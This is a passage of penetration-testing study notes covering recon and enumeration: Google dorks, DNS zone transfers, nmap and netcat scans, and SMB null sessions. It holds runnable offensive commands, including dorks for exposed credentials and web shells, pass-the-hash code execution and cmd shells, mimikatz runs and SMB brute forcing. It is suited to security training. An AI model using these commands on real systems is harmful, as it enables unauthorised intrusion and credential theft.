</code></pre></div><p>Near the bottom of password_cracking_filtered.pcap, after many 401 Authorization Required bad attempts, a 301 occurs after using the following credentials:</p>
<pre><code>GET //admin HTTP/1.1
Host: admin.conglomerate.com:81
User-Agent: Teh Forest Lobster
Authorization: Basic YWRtaW46bmFub3RlY2hub2xvZ3kx
  Credentials: admin:nanotechnology1
</code></pre><h3 id="tcp-flags">TCP Flags</h3>
<p>14th byte of the TCP header</p>
<pre><code>CEUAPRSF
WCRCSSYI
REGKHTNN
</code></pre><p>Apparently, HTTP requests and responses have TCP flags PSH and ACK enabled. To calculate ACK and PSH flags in decimal to use in tcpdump filter:</p>
<pre><code>CEUAPRSF
00011000 = 24 in decimal
</code></pre><p>Online reference: <a href="http://rapid.web.unc.edu/resources/tcp-flag-key/">http://rapid.web.unc.edu/resources/tcp-flag-key/</a></p>
<p>Finally, to filter out the HTTP packets, execute the following command, specifying that the 14th byte in the packets displayed should have ACK/PSH flags set:</p>
<p><code>tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap</code></p>
<h1 id="passive-info-gathering">Passive Info Gathering</h1>
<h2 id="open-web-information-gathering">Open Web Information Gathering</h2>
<h3 id="google-hacking">Google Hacking</h3>
<ul>
<li><code>filetype</code></li>
<li><code>inurl</code></li>
<li><code>intitle</code></li>
<li><code>intext</code></li>
</ul>
<p>Powerpoint files with the phrase &ldquo;penetration testing&rdquo; in it, from microsoft.com</p>
<p><code>site:microsoft.com filetype:ppt &quot;penetration testing&quot;</code></p>
<p>VNC Viewer</p>
<p><code>intitle:&quot;VNC viewer for Java&quot;</code></p>
<p>Mobotix IPcam (admin creds - admin:meinsm)</p>
<p><code>inurl:&quot;/control/userimage.html&quot;</code></p>
<p>phpMyAdmin No Authentication Databases</p>
<p><code>inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin</code></p>
<p>N3tShell Compromised Websites</p>
<p><code>intitle:&quot;-N3t&quot; filetype:php undetectable</code></p>
<p>Default Pages of Devices</p>
<p><code>intitle:&quot;NetBotz Applicance&quot; &quot;OK&quot; -filetype:pdf</code></p>
<p>Hardware with Known Vulnerabilities</p>
<p><code>intitle:&quot;SpeedStream Router Management Interface&quot;</code></p>
<p>Web Accessible, Open Cisco Routers</p>
<p><code>inurl:&quot;level/15/exec/-/show&quot;</code></p>
<p>Exposed Frontpage Credentials</p>
<p><code>&quot;# -FrontPage-&quot; filetype:pwd inurl:(service | authors | administrators | users)</code></p>
<h2 id="email-harvesting">Email Harvesting</h2>
<p><code>theharvester -d cisco.com -b google</code></p>
<h2 id="additional-resources">Additional Resources</h2>
<h3 id="netcraft">Netcraft</h3>
<p><a href="https://www.netcraft.com/">https://www.netcraft.com/</a></p>
<p>Find all subdomains</p>
<p><code>*.cisco.com</code></p>
<h3 id="whois">Whois</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">whois cisco.com
whois 8.8.8.8
</code></pre></div><h2 id="recon-ng">Recon-ng</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">recon-ng
use recon/domains-contacts/whois_pocs <span style="color:#75715e"># Contact details from whois results</span>
use recon/domains-vulnerabilities/xssed <span style="color:#75715e"># Find xss vulnerabilities using xssed.com</span>
use recon/domains-hosts/google_site_web <span style="color:#75715e"># Automatically find subdomains using Google search</span>
</code></pre></div><h1 id="active-information-gathering">Active Information Gathering</h1>
<h2 id="41-dns-enumeration">4.1 DNS Enumeration</h2>
<h3 id="interacting-with-a-dns-server">Interacting with a DNS Server</h3>
<p><code>host -t [type] [domain]</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">host -t ns conglomerate.com <span style="color:#75715e"># dns nameservers</span>
host -t mx conglomerate.com <span style="color:#75715e"># mailservers</span>
</code></pre></div><h3 id="automating-lookups">Automating Lookups</h3>
<p>Forward Lookup</p>
<p><code>host [subdomain]</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">host www.conglomerate.com <span style="color:#75715e"># get ip of www.conglomerate.com</span>
host idontexist.conglomerate.com <span style="color:#75715e"># attempt to get ip of non existant subdomain</span>
</code></pre></div><h3 id="forward-lookup-brute-force">Forward Lookup Brute Force</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~# echo www &gt; list.txt
root@kali:~# echo ftp &gt;&gt; list.txt
root@kali:~# echo mail &gt;&gt; list.txt
root@kali:~# echo owa &gt;&gt; list.txt
root@kali:~# echo proxy &gt;&gt; list.txt
root@kali:~# echo router &gt;&gt; list.txt
root@kali:~# <span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>cat list.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> host $ip.conglomerate.com | grep <span style="color:#e6db74">&#39;has address&#39;</span>; <span style="color:#66d9ef">done</span>
www.conglomerate.com has address 38.100.193.76
mail.conglomerate.com has address 38.100.193.84
router.conglomerate.com has address 38.100.193.71
</code></pre></div><h3 id="reverse-lookup-brute-force">Reverse Lookup Brute Force</h3>
<p><code>host [ip]</code></p>
<p>With a rough idea of the target&rsquo;s subnet range, perform a reverse lookup brute force.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# <span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> host 38.100.193.$ip | grep -v <span style="color:#e6db74">&#39;not found&#39;</span> | grep conglomerate.com; <span style="color:#66d9ef">done</span>
66.193.100.38.in-addr.arpa domain name pointer syslog.conglomerate.com.
69.193.100.38.in-addr.arpa domain name pointer beta.conglomerate.com.
70.193.100.38.in-addr.arpa domain name pointer ns1.conglomerate.com.
72.193.100.38.in-addr.arpa domain name pointer admin.conglomerate.com.
73.193.100.38.in-addr.arpa domain name pointer mail2.conglomerate.com.
76.193.100.38.in-addr.arpa domain name pointer www.conglomerate.com.
77.193.100.38.in-addr.arpa domain name pointer vpn.conglomerate.com.
80.193.100.38.in-addr.arpa domain name pointer ns2.conglomerate.com.
84.193.100.38.in-addr.arpa domain name pointer mail.conglomerate.com.
85.193.100.38.in-addr.arpa domain name pointer snmp.conglomerate.com.
89.193.100.38.in-addr.arpa domain name pointer siem.conglomerate.com.
90.193.100.38.in-addr.arpa domain name pointer ns3.conglomerate.com.
91.193.100.38.in-addr.arpa domain name pointer router.conglomerate.com.
</code></pre></div><h3 id="dns-zone-transfers">DNS Zone Transfers</h3>
<p>If TCP port 53 is open, it may indicate that DNS zone transfers work.</p>
<p><code>host -l [domain] [nameserver]</code> or <code>host -t axfr [domain] [nameserver]</code></p>
<h4 id="failed-zone-transfer">Failed Zone Transfer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# host -l conglomerate.com ns1.conglomerate.com
Using domain server:
Name: ns1.conglomerate.com
Address: 38.100.193.70#53
Aliases:

Host conglomerate.com not found: 5<span style="color:#f92672">(</span>REFUSED<span style="color:#f92672">)</span>
; Transfer failed.
</code></pre></div><h4 id="successful-zone-transfer">Successful Zone Transfer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# host -l conglomerate.com ns2.conglomerate.com
Using domain server:
Name: ns2.conglomerate.com
Address: 38.100.193.80#53
Aliases:

conglomerate.com name server ns1.conglomerate.com.
conglomerate.com name server ns2.conglomerate.com.
conglomerate.com name server ns3.conglomerate.com.
admin.conglomerate.com has address 38.100.193.83
beta.conglomerate.com has address 38.100.193.88
fs1.conglomerate.com has address 38.100.193.82
intranet.conglomerate.com has address 38.100.193.87
mail.conglomerate.com has address 38.100.193.84
mail2.conglomerate.com has address 38.100.193.73
ns1.conglomerate.com has address 38.100.193.70
ns2.conglomerate.com has address 38.100.193.80
ns3.conglomerate.com has address 38.100.193.90
router.conglomerate.com has address 38.100.193.71
siem.conglomerate.com has address 38.100.193.89
snmp.conglomerate.com has address 38.100.193.85
support.conglomerate.com has address 173.246.47.170
syslog.conglomerate.com has address 38.100.193.66
test.conglomerate.com has address 38.100.193.67
vpn.conglomerate.com has address 38.100.193.77
www.conglomerate.com has address 38.100.193.76
www2.conglomerate.com has address 38.100.193.79
</code></pre></div><h4 id="automating-zone-transfers">Automating Zone Transfers</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> [domain name]&#34;</span>
    exit <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">fi</span>

<span style="color:#66d9ef">for</span> server in <span style="color:#66d9ef">$(</span>host -t ns $1 | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f4<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
    host -l $1 $server | grep <span style="color:#e6db74">&#39;has address&#39;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h3 id="relevant-tools-in-kali">Relevant Tools in Kali</h3>
<h4 id="4161---dnsrecon">4.1.6.1 - <code>dnsrecon</code></h4>
<ul>
<li><code>dnsrecon -d conglomerate.com</code></li>
<li><code>dnsrecon -d conglomerate.com -t axfr</code></li>
<li><code>dnsrecon -r 38.100.193.0/24 | grep conglomerate.com</code></li>
</ul>
<h4 id="4161---dnsenum">4.1.6.1 - <code>dnsenum</code></h4>
<ul>
<li><code>dnsenum zonetransfer.me</code></li>
</ul>
<h2 id="port-scanning">Port Scanning</h2>
<h3 id="tcp-connect--syn-scanning">TCP Connect / SYN Scanning</h3>
<h4 id="4211---connect-scanning">4.2.1.1 - Connect Scanning</h4>
<p>Relies on three-way/TCP handshake mechanism (syn, syn/ack, ack). Connect scan involves completing this handshake, if it is completed, port is open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -nvv -w 1.5 -z 10.0.0.19 3388-3390
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3390</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3389</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3388</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
sent 0, rcvd <span style="color:#ae81ff">0</span>
</code></pre></div><ul>
<li><code>-n</code> - no reverse lookup</li>
<li><code>-vv</code> - more verbose</li>
<li><code>-w</code> - timeout</li>
<li><code>-z</code> - zero IO mode, used for scanning</li>
</ul>
<h4 id="4212---stealth-syn-scanning">4.2.1.2 - &ldquo;Stealth&rdquo; SYN Scanning</h4>
<p>Send SYN packet without completing the TCP handshake (without sending final ack back). If a syn/ack is sent back, port is open.</p>
<p>Early and primitive firewalls logged completed TCP sessions, making syn scanning bypass firewall logging. This is no longer true with modern firewalls, and the term &ldquo;stealth&rdquo; is misleading. Users might believe their scans will somehow not be detected, when in fact, they will be.</p>
<h4 id="udp-scanning">UDP Scanning</h4>
<p>UDP stateless, no three-way handshake. If no reply is sent back, the UDP port is open. If it is closed, an ICMP port unreachable packet should be sent back.</p>
<p>UDP scans is often unreliable, as firewalls may drop ICMP packets / not send back anything at all, leading to false positives, and you will regularly see UDP port scans showing all UDP ports open.</p>
<p>People often forget to scan for UDP services, and stick only to TCP scanning, thereby seeing only half of the equation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -unvv -w 1.5 -z 192.168.1.23 160-165
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">165</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">164</span> <span style="color:#f92672">(</span>cmip-agent<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">163</span> <span style="color:#f92672">(</span>cmip-man<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">162</span> <span style="color:#f92672">(</span>snmp-trap<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">161</span> <span style="color:#f92672">(</span>snmp<span style="color:#f92672">)</span> open
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">160</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
</code></pre></div><h3 id="port-scanning-with-nmap">Port Scanning with Nmap</h3>
<p>There is a list of nearly all ports, associated services, and probability of them being open found at <code>/usr/share/nmap/nmap-services</code>.</p>
<p>Tabbing while a scan is in progress displays the progress.</p>
<h4 id="4241---accountability-for-your-traffic">4.2.4.1 - Accountability for Your Traffic</h4>
<p>Packet and byte counter using iptables</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># Reset counters and iptables rules</span>
iptables -Z <span style="color:#f92672">&amp;&amp;</span> iptables -F

<span style="color:#75715e"># Measure incoming traffic from lab machine</span>
iptables -I INPUT <span style="color:#ae81ff">1</span> -s 192.168.1.23 -j ACCEPT

<span style="color:#75715e"># Measure outgoing traffic to lab machine</span>
iptables -I OUTPUT <span style="color:#ae81ff">1</span> -d 192.168.1.23 -j ACCEPT
</code></pre></div><p><code>watch -n 1 iptables -nvL</code></p>
<h4 id="4242---network-sweeping">4.2.4.2 - Network Sweeping</h4>
<h5 id="default-sweep">Default Sweep</h5>
<p><code>nmap -sn 192.168.1.0/24</code> or <code>nmap -sP 192.168.1.0/24</code></p>
<h5 id="output-greppable">Output Greppable</h5>
<p><code>nmap -T4 -n -sn -oG - 192.168.1.0/24 | grep Up | cut -d' ' -f2</code></p>
<h5 id="specific-port">Specific Port</h5>
<p><code>nmap -T4 -n -sn -p 80 -oG - 192.168.1.0/24</code></p>
<h5 id="aggressive-connect-scan-on-top-ports">Aggressive Connect Scan on Top Ports</h5>
<p><code>nmap -sT -A --top-ports=20 192.168.1.0/24 -oG -</code></p>
<h3 id="os-fingerprinting">OS Fingerprinting</h3>
<p>Based on the slight implementation differences of the TCP/IP stack (default TTL, TCP window size, etc.) within Operating Systems.</p>
<p><code>nmap -O 192.168.1.23</code></p>
<h3 id="banner-grabbingservice-enumeration">Banner Grabbing/Service Enumeration</h3>
<p><code>nmap -sV -sT 192.168.1.23</code></p>
<p>An aggressive <code>-A</code> scan includes both <code>-sV</code>, <code>-O</code>, script scanning and traceroute: <code>nmap -A 192.168.1.23</code></p>
<h3 id="favourite-nmap-commands">Favourite Nmap Commands</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -T4 -n -sC -sV -p- -oN nmap-versions --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;*vuln*&#39;</span> <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
</code></pre></div><h4 id="unicornscan--nmap--onetwopunch"><code>unicornscan</code> + <code>nmap</code> = <code>onetwopunch</code></h4>
<p>Unicornscan supports asynchronous scans, speeding port scans on all 65535 ports. Nmap has powerful features that unicornscan does not have. With onetwopunch, unicornscan is used first to identify open ports, and then those ports are passed to nmap to perform further enumeration.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./onetwopunch.sh -t targets.txt -i tap0 -n <span style="color:#e6db74">&#39;-T4 -n -sC -sV -oN nmap-versions --script=*vuln*&#39;</span>
</code></pre></div><p>Note, when using wildcards in nmap&rsquo;s NSE script parameter in onetwopunch, do not include quotes.</p>
<h3 id="nmap-scripting-engine-nse">Nmap Scripting Engine (NSE)</h3>
<p>Found within <code>/usr/share/nmap/scripts</code></p>
<p>Common services, SMB, SMTP, SNMP</p>
<p><code>nmap --script=[script] 192.168.1.23</code></p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<h3 id="scanning-for-the-netbios-service">Scanning for the NetBIOS Service</h3>
<p>SMB NetBIOS service listens on TCP ports 139 and 445, as well as several UDP ports.</p>
<p><code>nmap -p 139,445 --open -oG smb.txt 192.168.1.0/24</code></p>
<p><code>nbtscan -r 192.168.1.0/24</code></p>
<h3 id="null-session-enumeration">Null Session Enumeration</h3>
<h4 id="vulnerable-smb-versions">Vulnerable SMB Versions</h4>
<p>Vulnerable versions:</p>
<ul>
<li>Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by default</li>
<li>Windows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can&rsquo;t be created default</li>
<li>Most Samba (Unix) servers</li>
</ul>
<p>List of SMB versions and corresponding Windows versions:</p>
<ul>
<li>SMB1 – Windows 2000, XP and Windows 2003.</li>
<li>SMB2 – Windows Vista SP1 and Windows 2008</li>
<li>SMB2.1 – Windows 7 and Windows 2008 R2</li>
<li>SMB3 – Windows 8 and Windows 2012.</li>
</ul>
<p>Empty LM and NTLM hashes:</p>
<ul>
<li>Empty LM Hash: <code>aad3b435b51404eeaad3b435b51404ee</code></li>
<li>Empty NT Hash: <code>31d6cfe0d16ae931b73c59d7e0c089c0</code></li>
</ul>
<h4 id="rpcclient"><code>rpcclient</code></h4>
<p>Manually probe a SMB server</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ rpcclient -U <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
Password:
rpcclient $&gt; srvinfo <span style="color:#75715e"># operating system version</span>
rpcclient $&gt; netshareenumall <span style="color:#75715e"># enumerate all shares and its paths</span>
rpcclient $&gt; enumdomusers <span style="color:#75715e"># enumerate usernames defined on the server</span>
rpcclient $&gt; getdompwinfo <span style="color:#75715e"># smb password policy configured on the server</span>
</code></pre></div><p>Apparently the rpcclient version in OffSec VM does not work well with creating null sessions. A downgrade to samba-4.5.15 is required: <a href="https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER&amp;highlight=NT_STATUS_INVALID_PARAMETER">https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER&amp;highlight=NT_STATUS_INVALID_PARAMETER</a> Place the export commands into a script and source it before using rpcclient to use the downgraded version, or place it in bashrc. NOTE, once downgraded, pth-winexe doesn&rsquo;t seem to work.</p>
<h4 id="enum4linux"><code>enum4linux</code></h4>
<p>Wrapper around smb programs like <code>rpcclient</code> to automate enumerating an SMB server. Produces tons of results when a null session is successful. NOTE: Make sure to downgrade rpcclient before using.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">enum4linux -a 192.168.1.23
enum4linux -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -a 192.168.1.23
</code></pre></div><h4 id="crackmapexec"><code>CrackMapExec</code></h4>
<p>Works perfectly, list shares and permissions, enum users, disks, code execute and run modules like mimikatz. Hashes work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares 192.168.1.23
crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute <span style="color:#ae81ff">4000</span> 192.168.1.23
crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --users 192.168.1.23
crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192.168.1.23
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192.168.1.23 <span style="color:#75715e"># reliable pth code execution</span>
</code></pre></div><h4 id="smbmap"><code>smbmap</code></h4>
<p>Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution don&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 192.168.1.23 <span style="color:#75715e"># similar to crackmapexec --shares</span>
smbmap -u guest -p <span style="color:#e6db74">&#39;&#39;</span> -H 192.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -r <span style="color:#75715e"># list top level dir</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -R <span style="color:#75715e"># list everything recursively</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -s wwwroot -R -A <span style="color:#e6db74">&#39;.*&#39;</span> <span style="color:#75715e"># download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -x whoami <span style="color:#75715e"># no work</span>
</code></pre></div><h4 id="smbclient"><code>smbclient</code></h4>
<p>Access SMB shares interactively, seems to work with anonymous access. Hashes don&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">smbclient //192.168.1.23/wwwroot
smbclient //192.168.1.23/C$ WIN20082017 -U Administrator
smbclient //192.168.1.23/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash <span style="color:#75715e"># make sure to only use the NT portion of the hash</span>
</code></pre></div><p>WARNNIG, be careful when using the <code>get</code> command to download absolute path files from the remote system. Eg. <code>get /etc/passwd</code> will download the passwd file and ovewrite YOUR <code>/etc/passwd</code>. Use <code>get /etc/passwd /tmp/passwd</code> instead.</p>
<p>To download recursively:</p>
<pre><code># Within smbclient, download everything recursively:
mask &quot;&quot;
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
</code></pre><h5 id="pth-winexe">pth-winexe</h5>
<p>Works great sometimes. Can open a windows cmd shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd <span style="color:#75715e"># using a plaintext password</span>
pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash</span>
pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># domain user</span>
pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash</span>
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># ntlm hash + empty lm hash</span>
<span style="color:#75715e"># or</span>
export SMBHASH<span style="color:#f92672">=</span>aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U Administrator% //192.168.1.23 cmd
</code></pre></div><h5 id="psexec-metasploit">psexec Metasploit</h5>
<p><code>exploit/windows/smb/psexec</code></p>
<h5 id="xfreerdp-remote-desktop-protocol">xfreerdp Remote Desktop Protocol</h5>
<p>Before using <code>xfreerdp</code>&rsquo;s <code>/pth</code> feature, you have to build and install latest version. Apparently updating and upgrading with <code>apt-get install freerdp-x11</code> only gets you <code>FreeRDP version 1.1.0-beta1</code>. The latest already 2+. Source and compilation guide: <a href="https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/">https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/</a> Still does not work after updating though.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:192.168.1.23
</code></pre></div><h3 id="nmap-smb-nse-scripts">Nmap SMB NSE Scripts</h3>
<ul>
<li>List all smb nse scripts - <code>ls -la /usr/share/nmap/scripts/smb*</code></li>
<li>Check smb and OS using nse script - <code>nmap -p 139,445 --script=smb-os-discovery 192.168.1.23</code></li>
<li>Check certain smb vulnerability against all hosts - <code>nmap -iL hosts -Pn -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1</code></li>
<li>Enumerate smb usernames (similar to <code>enumdomusers</code> with <code>rpcclient</code>) - <code>nmap -p 139,445 --script=smb-enum-users [ip]</code></li>
<li>Brute force smb creds - <code>nmap -p 139,445 --script=smb-brute [ip]</code></li>
<li>Check many common smb vulnerabilities against a host - <code>nmap -p 139,445 --script=smb*-vuln* --script-args=unsafe=1 [ip]</code></li>
</ul>
<p>Apparently if there are more than 10 hosts in the hosts input file, nmap won&rsquo;t scan them when using NSE.</p>
<p>Nmap removed the <code>smb-check-vulns</code> script with individual scripts: <a href="https://forums.offensive-security.com/showthread.php?4008-04-3-3-Changes-to-quot-Nmap-NSE-Scripts-quot">https://forums.offensive-security.com/showthread.php?4008-04-3-3-Changes-to-quot-Nmap-NSE-Scripts-quot</a></p>
<p>Vulscan is a NSE scripting module that enhances nmap and turns it into a vulnerability scanner: <a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a></p>
<h2 id="smtp-enumeration">SMTP Enumeration</h2>
<p>Important commands include:</p>
<ul>
<li><code>VRFY</code> - Asks the server to verify an email address</li>
<li><code>EXPN</code> - Asks the server for the membership of a mailing list</li>
</ul>
<p>Abuse these to verify existing users on a mail server.</p>
